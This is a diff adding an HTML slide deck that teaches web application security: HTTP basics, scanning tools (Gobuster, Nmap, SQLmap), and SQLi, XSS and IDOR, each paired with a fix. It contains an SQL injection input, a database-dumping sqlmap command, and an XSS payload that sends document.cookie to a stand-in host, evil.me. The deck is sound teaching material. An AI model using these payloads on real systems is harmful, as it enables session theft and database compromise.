@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Web Application Security // The Foundations</title>
+    
+    <!-- Load Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- Google Fonts for elite developer aesthetic -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    
+    <!-- FontAwesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        sans: ['"Plus Jakarta Sans"', 'sans-serif'],
+                        mono: ['"JetBrains Mono"', 'monospace'],
+                    },
+                    colors: {
+                        cyber: {
+                            bg: '#050507',
+                            panel: '#0c0c0e',
+                            border: '#1a1a1f',
+                            muted: '#52525b',
+                            green: '#22c55e',
+                            red: '#ef4444',
+                            orange: '#f97316',
+                            blue: '#3b82f6'
+                        }
+                    }
+                }
+            }
+        }
+    </script>
+
+    <style>
+        body {
+            background-color: #050507;
+            color: #f4f4f5;
+        }
+        .slide {
+            display: none;
+            opacity: 0;
+            transform: translateY(10px);
+            transition: opacity 0.3s cubic-bezier(0.16, 1, 0.3, 1), transform 0.3s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .slide.active {
+            display: flex;
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .unthinkable-border {
+            border: 1px solid #1a1a1f;
+        }
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+        ::-webkit-scrollbar-thumb {
+            background: #1a1a1f;
+            border-radius: 2px;
+        }
+    </style>
+</head>
+<body class="font-sans min-h-screen overflow-hidden flex flex-col justify-between p-6 md:p-12">
+
+    <!-- Top Meta Header -->
+    <header class="h-10 flex items-center justify-between shrink-0 border-b border-cyber-border pb-4">
+        <div class="flex items-center gap-3">
+            <span class="h-2 w-2 bg-cyber-green rounded-full animate-pulse shadow-[0_0_8px_#22c55e]"></span>
+            <span class="font-mono text-xs tracking-widest text-cyber-muted font-bold">UNTHINKABLE // ACADEMY</span>
+            <span class="text-zinc-800">|</span>
+            <span class="text-xs text-zinc-400 font-mono" id="deck-topic-meta">CORE CONCEPTS</span>
+        </div>
+        <div class="flex items-center gap-4">
+            <span class="text-xs text-zinc-500 font-mono">CURRICULUM v3.0</span>
+        </div>
+    </header>
+
+    <!-- Main Dynamic Slide Delivery System -->
+    <main class="flex-grow flex flex-col justify-center max-w-5xl mx-auto w-full py-8 overflow-y-auto">
+
+        <!-- SLIDE 1: TITLE -->
+        <section class="slide active flex-col space-y-4" id="slide-1">
+            <span class="text-xs font-mono text-cyber-green tracking-widest uppercase">// MODULE 01 // WEB ARCHITECTURE</span>
+            <h1 class="text-4xl md:text-7xl font-black tracking-tight text-white leading-none">
+                Web Application <br><span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-green-600">Security</span>
+            </h1>
+            <p class="text-zinc-500 font-mono text-sm">33 short steps to understanding systems integrity.</p>
+        </section>
+
+        <!-- SLIDE 2: THE PREMISE -->
+        <section class="slide flex-col space-y-4" id="slide-2">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">01 // THE SYSTEM TRUTH</span>
+            <h2 class="text-3xl md:text-5xl font-extrabold text-white leading-tight">
+                The web is broken <br><span class="text-cyber-red font-mono font-normal">by default.</span>
+            </h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                If you write standard code without intentional security patterns, your boundaries are already breached.
+            </p>
+        </section>
+
+        <!-- SLIDE 3: WHAT IS THE WEB? -->
+        <section class="slide flex-col space-y-4" id="slide-3">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">02 // WEB FOUNDATIONS</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">What is the Web?</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                A globally distributed network of servers passing documents and state back and forth across untrusted public routers.
+            </p>
+            <div class="font-mono text-xs text-cyber-muted border-l-2 border-cyber-border pl-4">
+                TCP/IP + DNS + HTTP = The structural foundation.
+            </div>
+        </section>
+
+        <!-- SLIDE 4: CLIENT-SERVER ARCHITECTURE -->
+        <section class="slide flex-col space-y-6" id="slide-4">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">03 // WEB FOUNDATIONS</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">Client-Server Model</h2>
+            <div class="grid grid-cols-2 gap-4">
+                <div class="p-4 border border-cyber-border rounded">
+                    <span class="text-cyber-blue font-mono text-xs block mb-1">CLIENT (BROWSER)</span>
+                    <span class="font-bold text-sm block">Initiates Connection &amp; Renders DOM</span>
+                </div>
+                <div class="p-4 border border-cyber-border rounded">
+                    <span class="text-cyber-green font-mono text-xs block mb-1">SERVER (API/DB)</span>
+                    <span class="font-bold text-sm block">Processes Logic &amp; Controls State</span>
+                </div>
+            </div>
+            <p class="text-zinc-500 text-xs font-mono">// Everything that passes between them is vulnerable to modification.</p>
+        </section>
+
+        <!-- SLIDE 5: HOW THE WEB WORKS: THE REQUEST -->
+        <section class="slide flex-col space-y-4" id="slide-5">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">04 // WEB PROTOCOLS</span>
+            <h2 class="text-lg font-bold text-cyber-blue font-mono">// The HTTP Request</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs overflow-x-auto text-zinc-400">
+                GET /api/v1/users HTTP/1.1<br>
+                Host: target.me<br>
+                Authorization: Bearer jwt_token_hash<br>
+                User-Agent: Mozilla/5.0
+            </div>
+            <p class="text-zinc-500 text-xs">The client packs verbs, headers, and bodies into plain-text streams.</p>
+        </section>
+
+        <!-- SLIDE 6: HOW THE WEB WORKS: THE RESPONSE -->
+        <section class="slide flex-col space-y-4" id="slide-6">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">05 // WEB PROTOCOLS</span>
+            <h2 class="text-lg font-bold text-cyber-green font-mono">// The HTTP Response</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs overflow-x-auto text-zinc-400">
+                HTTP/1.1 200 OK<br>
+                Content-Type: application/json<br>
+                Set-Cookie: session_id=secure_entropy_key<br><br>
+                { "status": "authenticated" }
+            </div>
+            <p class="text-zinc-500 text-xs">The server evaluates requests and ships back headers, status codes, and data payloads.</p>
+        </section>
+
+        <!-- SLIDE 7: STATELESSNESS -->
+        <section class="slide flex-col space-y-4" id="slide-7">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">06 // WEB STATES</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">HTTP is Stateless</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                Every request is independent. To maintain continuity, developers invented cookies, tokens, and storage nodes.
+            </p>
+            <div class="p-3 bg-cyber-panel border border-cyber-border rounded font-mono text-[11px] text-cyber-muted">
+                STATE MANAGEMENT = THE LARGEST ATTACK SURFACE
+            </div>
+        </section>
+
+        <!-- SLIDE 8: THE UNTRUSTED BOUNDARY -->
+        <section class="slide flex-col space-y-4" id="slide-8">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">07 // SECURITY SCOPE</span>
+            <h2 class="text-3xl md:text-5xl font-extrabold text-cyber-red leading-tight">
+                The browser is <br>attacker territory.
+            </h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                You do not control the user's runtime. Every request, cookie, headers configuration, and query string can be falsified.
+            </p>
+        </section>
+
+        <!-- SLIDE 9: WHAT IS WEB SECURITY? -->
+        <section class="slide flex-col space-y-4" id="slide-9">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">08 // SECURITY SCOPE</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">What is Web Security?</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                The practice of validating, auditing, and enforcing logical isolation boundaries at the server level, assuming the client is actively malicious.
+            </p>
+        </section>
+
+        <!-- SLIDE 10: THE GOLDEN RULE -->
+        <section class="slide flex-col space-y-4" id="slide-10">
+            <span class="text-xs font-mono text-cyber-green tracking-widest uppercase">09 // THE LITMUS TEST</span>
+            <h2 class="text-3xl md:text-5xl font-extrabold text-white leading-tight">
+                Never trust <br>the client.
+            </h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                This is the single root law of application security. If a validation check happens only in the browser, it does not exist.
+            </p>
+        </section>
+
+        <!-- SLIDE 11: IMPACT REPUTATION -->
+        <section class="slide flex-col space-y-4" id="slide-11">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">10 // CONSEQUENCES</span>
+            <h2 class="text-3xl md:text-5xl font-extrabold text-cyber-red leading-tight">
+                Reputational <br>Collapse.
+            </h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                When credentials exfiltrate publicly, client trust drops instantly to absolute zero.
+            </p>
+        </section>
+
+        <!-- SLIDE 12: IMPACT FINANCIAL -->
+        <section class="slide flex-col space-y-4" id="slide-12">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">11 // CONSEQUENCES</span>
+            <h2 class="text-3xl md:text-5xl font-extrabold text-cyber-red leading-tight">
+                Financial &amp; Legal <br>Liability.
+            </h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                Compliance penalties (GDPR, PCI-DSS) trigger devastating, existential business fines.
+            </p>
+        </section>
+
+        <!-- SLIDE 13: IMPACT INTELLECTUAL PROPERTY -->
+        <section class="slide flex-col space-y-4" id="slide-13">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">12 // CONSEQUENCES</span>
+            <h2 class="text-3xl md:text-5xl font-extrabold text-cyber-red leading-tight">
+                IP Theft &amp; Source <br>Exposure.
+            </h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                Intruders clone proprietary system models, private code repositories, and structural execution schemes.
+            </p>
+        </section>
+
+
+        <!-- SLIDE 14: TOOLING INTRO -->
+        <section class="slide flex-col space-y-4" id="slide-14">
+            <span class="text-xs font-mono text-cyber-green tracking-widest uppercase">// MODULE 02 // OFFENSIVE INSTRUMENTATION</span>
+            <h1 class="text-4xl md:text-7xl font-black tracking-tight text-white leading-none">
+                Offensive <br><span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-green-600">Tooling</span>
+            </h1>
+            <p class="text-zinc-500 font-mono text-sm">Command-line runtimes and proxies used to analyze, map, and exploit web endpoints.</p>
+        </section>
+
+        <!-- SLIDE 15: cURL INTRO -->
+        <section class="slide flex-col space-y-4" id="slide-15">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">13 // cURL ANALYTICS</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">cURL: What &amp; Why?</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                A CLI tool for transferring data with URLs. Security analysts use it to bypass browser UI restrictions, inject custom HTTP headers, and execute raw API tests instantly.
+            </p>
+            <div class="font-mono text-xs text-cyber-muted border-l-2 border-cyber-border pl-4">
+                Unbound by browser policies. Direct, scripting-friendly HTTP requests.
+            </div>
+        </section>
+
+        <!-- SLIDE 16: cURL HOW TO USE -->
+        <section class="slide flex-col space-y-4" id="slide-16">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">14 // cURL SYNTAX</span>
+            <h2 class="text-lg font-bold text-cyber-blue font-mono">// How to Use: API Header Tampering</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs text-zinc-300 overflow-x-auto">
+                curl -X POST https://api.target.me/v1/auth \<br>
+                &nbsp;&nbsp;-H "Content-Type: application/json" \<br>
+                &nbsp;&nbsp;-H "X-Forwarded-For: 127.0.0.1" \<br>
+                &nbsp;&nbsp;-d '{"role": "administrator"}' -v
+            </div>
+            <p class="text-zinc-500 text-xs font-mono">// The -v flag prints the TLS handshake, headers, and response telemetry.</p>
+        </section>
+
+
+        <!-- SLIDE 17: BURP SUITE INTRO -->
+        <section class="slide flex-col space-y-4" id="slide-17">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">15 // PROXY INSTRUMENTATION</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">Burp Suite: What &amp; Why?</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                An intercepting proxy that handles local traffic between your browser and the destination. It allows engineers to pause, modify, and replay requests.
+            </p>
+            <div class="font-mono text-xs text-cyber-muted border-l-2 border-cyber-border pl-4">
+                The industry standard for interactive manual security reviews.
+            </div>
+        </section>
+
+        <!-- SLIDE 18: BURP SUITE HOW TO USE -->
+        <section class="slide flex-col space-y-4" id="slide-18">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">16 // PROXY FLOW</span>
+            <h2 class="text-lg font-bold text-cyber-red font-mono">// How to Use: Intercept &amp; Repeater</h2>
+            <div class="grid grid-cols-2 gap-4">
+                <div class="p-4 border border-cyber-border rounded bg-cyber-panel">
+                    <span class="text-cyber-green font-mono text-xs block mb-1">01 / INTERCEPT</span>
+                    <span class="font-bold text-xs block text-zinc-300">Set browser proxy to port 8080, pause request threads, modify raw parameters, and forward.</span>
+                </div>
+                <div class="p-4 border border-cyber-border rounded bg-cyber-panel">
+                    <span class="text-cyber-blue font-mono text-xs block mb-1">02 / REPEATER</span>
+                    <span class="font-bold text-xs block text-zinc-300">Send an active packet to the Repeater sandbox. Edit parameters iteratively without browser interactions.</span>
+                </div>
+            </div>
+        </section>
+
+        <!-- SLIDE 19: GOBUSTER INTRO -->
+        <section class="slide flex-col space-y-4" id="slide-19">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">17 // RECONNAISSANCE</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">Gobuster: What &amp; Why?</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                An active reconnaissance directory brute-forcer. It parses wordlists to locate unlinked endpoints, diagnostic panels, or backup files hidden on a web server.
+            </p>
+            <div class="font-mono text-xs text-cyber-muted border-l-2 border-cyber-border pl-4">
+                Rapid subdirectory and subdomain mapping written in Go.
+            </div>
+        </section>
+
+        <!-- SLIDE 20: GOBUSTER HOW TO USE -->
+        <section class="slide flex-col space-y-4" id="slide-20">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">18 // SUBDIRECTORY BRUTEFORCE</span>
+            <h2 class="text-lg font-bold text-cyber-blue font-mono">// How to Use: Scanning Hidden Assets</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs text-zinc-300 overflow-x-auto">
+                gobuster dir -u https://target.me/ -w common_wordlist.txt -x php,json,bak,zip -t 50
+            </div>
+            <p class="text-zinc-500 text-xs">Runs 50 parallel threads (<code class="text-cyber-green font-mono">-t 50</code>) mapping common filenames alongside designated extensions (<code class="text-cyber-green font-mono">-x</code>).</p>
+        </section>
+
+
+        <!-- SLIDE 21: NMAP INTRO -->
+        <section class="slide flex-col space-y-4" id="slide-21">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">19 // SERVICE AUDITING</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">Nmap: What &amp; Why?</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                A network exploration and port auditing scanner. It determines what ports are open, which web servers are running, and what operating systems host your targets.
+            </p>
+            <div class="font-mono text-xs text-cyber-muted border-l-2 border-cyber-border pl-4">
+                Locates exposed infrastructure services like database endpoints and SSH channels.
+            </div>
+        </section>
+
+        <!-- SLIDE 22: NMAP HOW TO USE -->
+        <section class="slide flex-col space-y-4" id="slide-22">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">20 // PORT ANALYSIS</span>
+            <h2 class="text-lg font-bold text-cyber-blue font-mono">// How to Use: Web Server Audit</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs text-zinc-300 overflow-x-auto">
+                nmap -sV -sC -p 80,443,8080,3306 target.me
+            </div>
+            <p class="text-zinc-500 text-xs">Examines software versions (<code class="text-cyber-green font-mono">-sV</code>) and triggers default scanning scripts (<code class="text-cyber-green font-mono">-sC</code>) to identify known software flaws.</p>
+        </section>
+
+        <!-- SLIDE 23: SQLMAP INTRO -->
+        <section class="slide flex-col space-y-4" id="slide-23">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">21 // EXPLOITATION AUTOMATION</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">SQLmap: What &amp; Why?</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                An automated database injection engine. It automatically identifies injection points, extracts database structures, and dumps credentials without manual script writing.
+            </p>
+            <div class="font-mono text-xs text-cyber-muted border-l-2 border-cyber-border pl-4">
+                Automates SQLi detection from simple error pages to complex blind delays.
+            </div>
+        </section>
+
+        <!-- SLIDE 24: SQLMAP HOW TO USE -->
+        <section class="slide flex-col space-y-4" id="slide-24">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">22 // DATABASE DUMPING</span>
+            <h2 class="text-lg font-bold text-cyber-blue font-mono">// How to Use: Extracting Database Schema</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs text-zinc-300 overflow-x-auto">
+                sqlmap -u "https://target.me/api/users?id=1" --dbms=mysql --dbs --batch
+            </div>
+            <p class="text-zinc-500 text-xs">Targets a specific database management system (<code class="text-cyber-green font-mono">--dbms</code>) and extracts schema footprints while running on autopilot (<code class="text-cyber-green font-mono">--batch</code>).</p>
+        </section>
+
+
+        <!-- SLIDE 25: ATTACK SQL INJECTION -->
+        <section class="slide flex-col space-y-4" id="slide-25">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">23 // CORE ATTACKS</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">Attack #1: SQL Injection (SQLi)</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                Occurs when user data parameters escape variable isolation and execute directly inside database queries.
+            </p>
+            <div class="p-3 bg-cyber-panel border border-cyber-border rounded font-mono text-[11px] text-cyber-muted">
+                OWASP TOP 10 // CORE INJECTION
+            </div>
+        </section>
+
+        <!-- SLIDE 26: SQLI VULNERABLE CODE -->
+        <section class="slide flex-col space-y-4" id="slide-26">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">24 // SQLi DETAILS</span>
+            <h2 class="text-lg font-bold text-cyber-red font-mono">// Vulnerable Code Pattern</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs overflow-x-auto text-zinc-400">
+                const sql = `SELECT * FROM users WHERE email = '${user_input}'`;
+            </div>
+            <p class="text-zinc-500 text-xs font-mono">// Dynamic string concatenation blends script context and user input.</p>
+        </section>
+
+        <!-- SLIDE 27: SQLI EXPLOIT -->
+        <section class="slide flex-col space-y-4" id="slide-27">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">25 // SQLi DETAILS</span>
+            <h2 class="text-lg font-bold text-cyber-red font-mono">// Exploit Input</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs text-cyber-red">
+                admin@domain.com' OR '1'='1
+            </div>
+            <div class="p-4 bg-zinc-950 rounded border border-cyber-border font-mono text-xs text-zinc-400">
+                SELECT * FROM users WHERE email = 'admin@domain.com' OR '1'='1'
+            </div>
+        </section>
+
+        <!-- SLIDE 28: SQLI SECURE FIX -->
+        <section class="slide flex-col space-y-4" id="slide-28">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">26 // SQLi MITIGATION</span>
+            <h2 class="text-lg font-bold text-cyber-green font-mono">// Secure Parameterized Pattern</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs overflow-x-auto text-zinc-300">
+                const sql = 'SELECT * FROM users WHERE email = ?';<br>
+                const [rows] = await db.execute(sql, [user_input]);
+            </div>
+            <p class="text-zinc-500 text-xs">Forces variables to execute strictly as simple text literals.</p>
+        </section>
+
+        <!-- SLIDE 29: ATTACK CROSS SITE SCRIPTING -->
+        <section class="slide flex-col space-y-4" id="slide-29">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">27 // CORE ATTACKS</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">Attack #2: Cross-Site Scripting (XSS)</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                Happens when untrusted user payload constructs execute inside a third-party client's browser DOM scope.
+            </p>
+            <div class="p-3 bg-cyber-panel border border-cyber-border rounded font-mono text-[11px] text-cyber-muted">
+                STOLEN SESSIONS // MALICIOUS DOM OVERLAYS
+            </div>
+        </section>
+
+        <!-- SLIDE 30: XSS VULNERABLE CODE -->
+        <section class="slide flex-col space-y-4" id="slide-30">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">28 // XSS DETAILS</span>
+            <h2 class="text-lg font-bold text-cyber-red font-mono">// Vulnerable HTML Node</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs text-zinc-400">
+                &lt;div&gt; Search Results: ${query_param} &lt;/div&gt;
+            </div>
+            <p class="text-zinc-500 text-xs">Direct variable injection without output encoding triggers script execution.</p>
+        </section>
+
+        <!-- SLIDE 31: XSS EXPLOIT -->
+        <section class="slide flex-col space-y-4" id="slide-31">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">29 // XSS DETAILS</span>
+            <h2 class="text-lg font-bold text-cyber-red font-mono">// Exploit Input</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs text-cyber-red">
+                &lt;img src="x" onerror="fetch('https://evil.me/steal?cookie=' + document.cookie)"&gt;
+            </div>
+            <p class="text-zinc-500 text-xs">Allows attackers to capture raw session context tokens instantly.</p>
+        </section>
+
+        <!-- SLIDE 32: XSS SECURE FIX -->
+        <section class="slide flex-col space-y-4" id="slide-32">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">30 // XSS MITIGATION</span>
+            <h2 class="text-lg font-bold text-cyber-green font-mono">// Contextual Entity Encoding</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs text-zinc-300">
+                &amp;lt;img src=&amp;quot;x&amp;quot; onerror=&amp;quot;...&amp;quot;&amp;gt;
+            </div>
+            <p class="text-zinc-500 text-xs">Escapes execution parameters safely into standard plain text display layouts.</p>
+        </section>
+
+        <!-- SLIDE 33: ATTACK IDOR -->
+        <section class="slide flex-col space-y-4" id="slide-33">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">31 // CORE ATTACKS</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">Attack #3: IDOR</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                Insecure Direct Object References: Querying system resources by direct indexes without verified access checks.
+            </p>
+            <div class="p-3 bg-cyber-panel border border-cyber-border rounded font-mono text-[11px] text-cyber-muted">
+                OWASP TOP 10 // BROKEN ACCESS CONTROL
+            </div>
+        </section>
+
+        <!-- SLIDE 34: IDOR VULNERABLE CODE -->
+        <section class="slide flex-col space-y-4" id="slide-34">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">32 // IDOR DETAILS</span>
+            <h2 class="text-lg font-bold text-cyber-red font-mono">// Vulnerable API Endpoint</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs text-zinc-400">
+                app.get('/api/accounts/:id', async (req, res) => {<br>
+                &nbsp;&nbsp;const profile = await db.findAccount(req.params.id);<br>
+                &nbsp;&nbsp;res.json(profile);<br>
+                });
+            </div>
+        </section>
+
+        <!-- SLIDE 35: IDOR EXPLOIT -->
+        <section class="slide flex-col space-y-4" id="slide-35">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">33 // IDOR DETAILS</span>
+            <h2 class="text-lg font-bold text-cyber-red font-mono">// Attack Vectors</h2>
+            <div class="grid grid-cols-2 gap-4">
+                <div class="p-4 border border-cyber-border rounded">
+                    <span class="text-xs text-cyber-muted font-mono block">YOUR PROFILE ID</span>
+                    <span class="font-bold text-sm block">/api/accounts/103</span>
+                </div>
+                <div class="p-4 border border-cyber-red/30 bg-cyber-red/10 rounded">
+                    <span class="text-xs text-cyber-red font-mono block">TARGET ATTACK OBJECT</span>
+                    <span class="font-bold text-sm block">/api/accounts/101</span>
+                </div>
+            </div>
+            <p class="text-zinc-500 text-xs">Exposes raw accounts directly by manual integer tampering.</p>
+        </section>
+
+        <!-- SLIDE 36: IDOR SECURE FIX -->
+        <section class="slide flex-col space-y-4" id="slide-36">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">34 // IDOR MITIGATION</span>
+            <h2 class="text-lg font-bold text-cyber-green font-mono">// Secure Context Verification</h2>
+            <div class="p-4 bg-cyber-panel border border-cyber-border rounded font-mono text-xs text-zinc-300 overflow-x-auto">
+                if (req.user.id !== req.params.id) {<br>
+                &nbsp;&nbsp;return res.status(403).json({ error: 'Access Denied' });<br>
+                }
+            </div>
+            <p class="text-zinc-500 text-xs">Always validate resource requests against current authenticated session IDs.</p>
+        </section>
+
+        <!-- SLIDE 37: TOOLING INTRO -->
+        <section class="slide flex-col space-y-4" id="slide-37">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">35 // INSTRUMENTATION SUMMARY</span>
+            <h2 class="text-3xl md:text-5xl font-extrabold text-white leading-tight">
+                Synthesize your <br><span class="text-cyber-green font-mono font-normal">analysis tools.</span>
+            </h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                Offensive instrumentation maps the targets, and defensive analyzers block automated scans before compilation pipelines complete.
+            </p>
+        </section>
+
+        <!-- SLIDE 38: DELETED EXTEND SLIDE -->
+        <section class="slide flex-col space-y-4" id="slide-38">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">36 // DEFENSIVE ECOSYSTEM</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">Dynamic Traffic Control</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                By setting proxy policies and request rate-limiting profiles on your networks, you can block scanning suites like sqlmap and gobuster completely.
+            </p>
+            <div class="font-mono text-xs text-cyber-muted border-l-2 border-cyber-border pl-4">
+                Automated filtering layers.
+            </div>
+        </section>
+
+        <!-- SLIDE 39: DEFENSIVE TOOLING -->
+        <section class="slide flex-col space-y-6" id="slide-39">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">37 // INSTRUMENTATION</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">The Defensive Toolkit</h2>
+            <div class="grid grid-cols-3 gap-4 font-mono text-xs">
+                <div class="p-3 border border-cyber-border rounded">
+                    <span class="text-cyber-green block mb-1">SAST</span>
+                    Source scanning.
+                </div>
+                <div class="p-3 border border-cyber-border rounded">
+                    <span class="text-cyber-green block mb-1">DAST</span>
+                    Runtime fuzzing.
+                </div>
+                <div class="p-3 border border-cyber-border rounded">
+                    <span class="text-cyber-green block mb-1">SCA</span>
+                    Package checks.
+                </div>
+            </div>
+        </section>
+
+        <!-- SLIDE 40: SHIFT LEFT -->
+        <section class="slide flex-col space-y-4" id="slide-40">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">38 // SHIFTING LEFT</span>
+            <h2 class="text-3xl md:text-5xl font-extrabold text-white leading-tight">
+                Secure design <br><span class="text-cyber-green font-mono font-normal">starts on day zero.</span>
+            </h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                Threat modeling begins during early API conceptualization steps—long before compilation pipelines execute.
+            </p>
+        </section>
+
+        <!-- SLIDE 41: DEFENSE IN DEPTH -->
+        <section class="slide flex-col space-y-4" id="slide-41">
+            <span class="text-xs font-mono text-cyber-muted tracking-widest uppercase">39 // DEFENSIVE CONCEPTS</span>
+            <h2 class="text-2xl md:text-4xl font-extrabold text-white">Defense-in-Depth</h2>
+            <p class="text-zinc-400 text-sm max-w-xl leading-relaxed">
+                Never trust a singular protection layer. Stack validation routines, web application firewalls, and least-privilege databases.
+            </p>
+            <div class="font-mono text-xs text-cyber-muted border-l-2 border-cyber-border pl-4">
+                Redundant boundaries.
+            </div>
+        </section>
+
+        <!-- SLIDE 42: OUTRO -->
+        <section class="slide flex-col space-y-4" id="slide-42">
+            <span class="text-xs font-mono text-cyber-green tracking-widest uppercase">// MODULE COMPLETE</span>
+            <h2 class="text-4xl md:text-6xl font-black tracking-tight text-white leading-tight">
+                Build secure systems <br><span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-green-600">by default.</span>
+            </h2>
+            <p class="text-zinc-500 font-mono text-xs">Thank you for attending. Run complete verification steps.</p>
+        </section>
+
+    </main>
+
+    <!-- Floating Footer Presentation Controls -->
+    <footer class="h-14 border-t border-cyber-border pt-4 flex items-center justify-between shrink-0">
+        <span class="text-[10px] font-mono text-cyber-muted tracking-wider uppercase">UNTHINKABLE // ACADEMY</span>
+        
+        <div class="flex items-center gap-6">
+            <!-- Global progress tracker bar -->
+            <div class="flex items-center gap-3">
+                <div class="h-1.5 w-32 bg-cyber-border relative rounded-full overflow-hidden">
